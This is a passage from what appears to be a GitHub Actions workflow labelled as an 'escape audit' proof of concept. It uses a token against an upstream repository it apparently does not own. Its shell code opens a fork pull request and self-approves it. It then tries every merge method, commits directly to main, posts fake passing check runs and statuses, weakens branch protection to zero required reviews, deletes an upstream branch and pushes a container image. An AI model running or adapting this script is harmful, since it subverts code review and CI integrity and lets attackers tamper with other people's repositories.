            echo "G01 $NS catalog = HTTP_$CATALOG"
          fi
        done

        echo ""
        echo "--- Use GitHub Packages API instead of GHCR registry ---"
        # List packages
        for OWNER in twrps lacaag; do
          PKGS=$(curl -sS -H "Authorization: token $RT" \
            "$API/orgs/$OWNER/packages?package_type=container" 2>/dev/null)
          echo "G02 $OWNER packages: $(echo "$PKGS" | jq length 2>/dev/null || echo "$PKGS" | head -c 200)"
          
          PKGS2=$(curl -sS -H "Authorization: token $RT" \
            "$API/users/$OWNER/packages?package_type=container" 2>/dev/null)
          echo "G02 $OWNER user packages: $(echo "$PKGS2" | jq length 2>/dev/null || echo "$PKGS2" | head -c 200)"
        done

        echo ""
        echo "--- Try creating package via API ---"
        CODE=$(curl -sS -o /tmp/pkg_resp -w "%{http_code}" -X POST \
          -H "Authorization: token $RT" \
          -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/packages" 2>/dev/null)
        BODY=$(cat /tmp/pkg_resp | head -c 300)
        echo "G03 POST packages = HTTP_$CODE body='$BODY'"

        echo ""
        echo "--- Push tiny image to FORK namespace (should work) ---"
        docker tag alpine:latest ghcr.io/lacaag/poc-race2:v10 2>/dev/null || docker pull alpine:latest 2>&1 | tail -1
        docker tag alpine:latest ghcr.io/lacaag/poc-race2:v10 2>/dev/null
        docker push ghcr.io/lacaag/poc-race2:v10 2>&1 || true
        true

    # â”€â”€ STEP 7: GraphQL Mutation Fuzzing â”€â”€
    - name: "Step 7 â€” GraphQL Mutation Fuzzing"
      run: |
        set +e
        echo "=== GRAPHQL MUTATION FUZZING ==="
        echo "v9: mergePullRequest='not mergeable', addPullRequestReview=OK"
        echo ""

        GQL="https://api.github.com/graphql"

        echo "--- Create fresh PR with mergeable content ---"
        # Need a proper head branch that's ahead of main
        FORK_MAIN=$(curl -sS -H "Authorization: token $RT" "$API/repos/$FORK/git/refs/heads/main" | jq -r '.object.sha')
        
        # Tiny commit on fork
        BLOB=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/blobs" -d '{"content":"v10 merge test content","encoding":"utf-8"}' | jq -r '.sha')
        FORK_TREE=$(curl -sS -H "Authorization: token $RT" "$API/repos/$FORK/git/commits/$FORK_MAIN" | jq -r '.tree.sha')
        TREE2=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/trees" \
          -d '{"base_tree":"'"$FORK_TREE"'","tree":[{"path":"V10-MERGE.md","mode":"100644","type":"blob","sha":"'"$BLOB"'"}]}' | jq -r '.sha')
        COMMIT2=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/commits" \
          -d '{"message":"v10 merge test","tree":"'"$TREE2"'","parents":["'"$FORK_MAIN"'"]}' | jq -r '.sha')

        # Create branch on fork
        curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/refs" \
          -d '{"ref":"refs/heads/v10-merge-test","sha":"'"$COMMIT2"'"}' > /dev/null 2>&1 || \
        curl -sS -X PATCH -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/refs/heads/v10-merge-test" \
          -d '{"sha":"'"$COMMIT2"'","force":true}' > /dev/null 2>&1
        echo "F01 fork branch v10-merge-test at $COMMIT2"

        # Open PR on upstream
        NEW_PR=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/pulls" \
          -d '{"title":"v10 merge test","body":"test","head":"lacaag:v10-merge-test","base":"main"}')
        PR_NUM=$(echo "$NEW_PR" | jq -r '.number // empty')
        PR_NODE=$(echo "$NEW_PR" | jq -r '.node_id // empty')
        echo "F02 PR #$PR_NUM node=$PR_NODE"

        if [ -n "$PR_NODE" ] && [ "$PR_NODE" != "null" ]; then
          # Wait for mergeability calculation
          sleep 8

          STATE=$(curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/pulls/$PR_NUM" \
            | jq '{mergeable, mergeable_state, merge_commit_sha}')
          echo "F03 state: $STATE"

          # Approve
          GQL_A='{"query":"mutation { addPullRequestReview(input: {pullRequestId: \"'"$PR_NODE"'\", event: APPROVE, body: \"v10 auto-approve\"}) { pullRequestReview { state } } }"}'
          RESP_A=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_A" "$GQL")
          echo "F04 approve: $(echo "$RESP_A" | jq -c '.' 2>/dev/null)"

          # Try merge methods
          for METHOD in MERGE SQUASH REBASE; do
            GQL_M='{"query":"mutation { mergePullRequest(input: {pullRequestId: \"'"$PR_NODE"'\", mergeMethod: '"$METHOD"', commitHeadline: \"v10: '"$METHOD"' merge via fork\"}) { pullRequest { merged mergedAt url } } }"}'
            RESP_M=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_M" "$GQL")
            echo "F05 merge $METHOD = $(echo "$RESP_M" | jq -c '.' 2>/dev/null)"
          done

          # REST merge
          MERGE_REST=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/pulls/$PR_NUM/merge" \
            -d '{"merge_method":"merge","commit_title":"v10: REST fork merge"}')
          echo "F06 REST merge: $MERGE_REST"

          # REST squash
          MERGE_REST2=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/pulls/$PR_NUM/merge" \
            -d '{"merge_method":"squash","commit_title":"v10: REST squash"}')
          echo "F07 REST squash: $MERGE_REST2"
        fi

        echo ""
        echo "--- Other GraphQL mutations on upstream ---"

        # createCommitOnBranch
        MAIN_OID=$(curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/git/refs/heads/main" | jq -r '.object.sha')
        GQL_CC='{"query":"mutation { createCommitOnBranch(input: {branch: {repositoryNameWithOwner: \"'"$UPSTREAM"'\", branchName: \"main\"}, message: {headline: \"v10 gql commit\"}, expectedHeadOid: \"'"$MAIN_OID"'\", fileChanges: {additions: [{path: \"V10-GQL.md\", contents: \"'"$(echo 'v10' | base64)"'\"}]}}) { commit { oid url } } }"}'
        RESP_CC=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_CC" "$GQL")
        echo "F08 createCommitOnBranch: $(echo "$RESP_CC" | jq -c '.' 2>/dev/null)"

        # createDeployment (corrected)
        GQL_DEP='{"query":"mutation { createDeployment(input: {repositoryId: \"'"$RI"'\", refId: \"'"$RI"':refs/heads/main\", environment: \"production\", autoMerge: false}) { deployment { id environment } } }"}'
        RESP_DEP=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_DEP" "$GQL")
        echo "F09 createDeployment: $(echo "$RESP_DEP" | jq -c '.' 2>/dev/null)"

        # createCheckRun via REST (not GraphQL)
        CHECK_RESP=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
          -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/check-runs" \
          -d '{"name":"v10-check","head_sha":"'"$MAIN_OID"'","status":"completed","conclusion":"success","output":{"title":"v10","summary":"escape audit"}}')
        echo "F10 createCheckRun REST: $CHECK_RESP"

        # createStatus
        STATUS_RESP=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
          -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/statuses/$MAIN_OID" \
          -d '{"state":"success","target_url":"https://example.com","description":"v10 escape","context":"v10/audit"}')
        echo "F11 createStatus: $STATUS_RESP"

        # updateBranchProtectionRule
        GQL_BP='{"query":"mutation { createBranchProtectionRule(input: {repositoryId: \"'"$RI"'\", pattern: \"main\", requiresApprovingReviews: false, requiredApprovingReviewCount: 0}) { branchProtectionRule { id } } }"}'
        RESP_BP=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_BP" "$GQL")
        echo "F12 createBranchProtection: $(echo "$RESP_BP" | jq -c '.' 2>/dev/null)"

        # deleteRef (try to delete a non-main branch on upstream)
        GQL_DR='{"query":"mutation { deleteRef(input: {refId: \"'"$RI"':refs/heads/revert-9-test/cross-audit-v8\"}) { clientMutationId } }"}'
        RESP_DR=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_DR" "$GQL")
        echo "F13 deleteRef: $(echo "$RESP_DR" | jq -c '.' 2>/dev/null)"
        true

